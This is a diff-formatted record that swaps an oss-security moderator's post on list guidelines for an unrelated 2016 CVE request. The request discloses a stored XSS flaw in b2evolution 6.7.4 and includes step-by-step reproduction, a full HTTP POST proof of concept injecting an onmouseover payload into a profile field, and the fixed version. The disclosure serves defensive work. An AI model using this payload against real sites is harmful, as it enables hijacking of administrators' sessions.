@@ -1,64 +1,59 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/15/6
-Message-ID: <20160215151847.GA25532@openwall.com>
-Date: Mon, 15 Feb 2016 18:18:47 +0300
-From: Solar Designer <solar@...nwall.com>
-To: David Leo <httpsonly.github.io@...il.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: Browser Security Tool: HTTPS Only (Why, How, Open Source, Python)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/12/4
+Message-ID: <6D072F0A5597B449BEE8A9770E0BDBEA018D293C@EX01.corp.qihoo.net>
+Date: Fri, 12 Aug 2016 07:18:53 +0000
+From: 陈瑞琦 <chenruiqi@....cn>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE request: XSS vuln in b2evolution v6.7.4
 Content-Type: text/plain; charset=utf-8
 
-On Sun, Feb 14, 2016 at 10:07:21PM -0500, David Leo wrote:
-> (@moderators The original post was too brief. This one has details.)
+I found a XSS vuln in b2evolution v6.7.4
 
-As a moderator for oss-security, I was torn between rejecting this
-message and using it as an example of what (not) to post in here.
-I chose the latter.
+Title: Stored XSS in b2evolution version 6.7.4
+Author: Chen Ruiqi, Chenruiqi@....cn, @Codesafe Team
+Date: 2016-08-09
+Download Site: http://b2evolution.net/downloads/
+Vendor: b2evolution.net
+Vendor Notified: 2016-08-09
+Vendor Contact: http://b2evolution.net/?disp=msgform
+--------------------------------------------------------------------------------------------------------
+Discription:
+b2evolution is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
+b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a "one click install" web app.[3](Wiki)
+-----------------------------------------------------------------------------------------------------------
+Vulnerability:
+There is stored XSS in b2evolution version 6.7.4
+Any user can edit his or her twitter infomation at 'User Profile' with some evil code.
+And when the admin see the user profile at back-office, the page is lack of filter to protect the admin.
 
-There are few tool announcements in here.  I think we want more, but I
-also think we want them to be more relevant to this particular list and
-very infrequent for any one particular tool.  For most, it should be
-just one initial announcement and that's all - no updates - unless the
-tool is particularly relevant (e.g., a static analyzer, a fuzzer, or a
-generic privsep library) or the update is particularly major (especially
-if it's been years since the previous announcement).
+Step 1 : Register a user of the web-site
+Step 2 : Edit the twitter at http://192.168.204.128/b2evolution/index.php?disp=profile with something like https://twitter.com/kevino"onmouseover="alert(1)"onerror=1
+Step 3 : Save the changes
+Step 4 : The admin view the profile in back-office at http://192.168.204.128/b2evolution/admin.php?ctrl=users , when the mouse over the content, the XSS code runs.
 
-To make this policy explicit, and to actually invite the desirable kind
-of content, I've just added this:
+--------------------------------------------------------------------------------------------------------
+PoC Code:
+POST /b2evolution/htsrv/profile_update.php HTTP/1.1
+Host: 192.168.204.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.128/b2evolution/index.php?disp=profile
+Cookie: session_b2evo_192_168_204_128=49_I0EnVHgDXBKjsJd0e8fEhK6Ga82xEGDt; __smToken=AhuNTZNC8BaMfAVQV7ZpTW5a; evo_style=Variation
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 653
 
-"Occasional announcements of Open Source security tools (and relevant
-features of non-security tools) are acceptable, but only for initial
-announcements and major updates (not for minor updates).  Especially
-desirable are news on tools/features aimed to enhance security of other
-Open Source software."
+edited_user_login=kevino&edited_user_firstname=kevino&edited_user_lastname=kevino&edited_user_nickname=kevino&edited_user_gender=M&edited_user_ctry_ID=&edited_user_rgn_ID=&edited_user_subrg_ID=&edited_user_city_ID=&edited_user_age_min=&edited_user_age_max=&organizations%5B%5D=&uf_38=kevino&uf_39=kevino&uf_40=kevino&uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&uf_43=http%3A%2F%2Fkevino.net%2Fkevino&new_field_type=3&actionArray%5Bupdate%5D=Save+Changes%21&crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&user_tab=profile&identity_form=1&user_ID=8&blog=1&orig_user_ID=8
+----------------------------------------------------------------------------------------------------------
+Fix Code:
+Update to the version 6.7.5
+https://github.com/b2evolution/b2evolution/commit/83c40129f471b659755491a02b2ad981995d37c1
 
-to:
+Could you assign CVE id for this?
 
-http://oss-security.openwall.org/wiki/mailing-lists/oss-security#list-content-guidelines
+Thank you
 
-We also previously had:
-
-"Please don't cross-post messages to oss-security and other mailing
-lists at once, especially not to high-volume lists such as LKML and
-netdev, as this tends to result in threads that wander partially or
-fully off-topic (e.g., Linux kernel coding style detail may end up being
-discussed in comments to a patch posted to LKML, but it would be
-off-topic for oss-security).  If you feel that something needs to be
-posted to oss-security and to another list, please make separate
-postings.  You may mention the other posting(s) in your oss-security
-posting, and even link to other lists' archives."
-
-We generally don't reject oss-security postings for CC's to other lists,
-in part because the problem (if any) is usually not with the original
-posting's content, but with the follow-ups that the CC's invite from
-other lists, which we have no control of (even if we reject the message,
-it may get through to the CC'ed lists).  However, we ask that senders
-please avoid CC's (except to upstream developers, etc., which is OK).
-While having Bugtraq or/and FD CC'ed is not as bad as having LKML CC'ed
-(due to those lists also having a security focus, unlike LKML), it is
-not welcome.
-
-(For LKML in particular, it's totally different for the kernel-hardening
-list, also hosted by Openwall.  On that list, CC'ing LKML is the norm.)
-
-Alexander
+Chen Ruiqi
+Codesafe Team
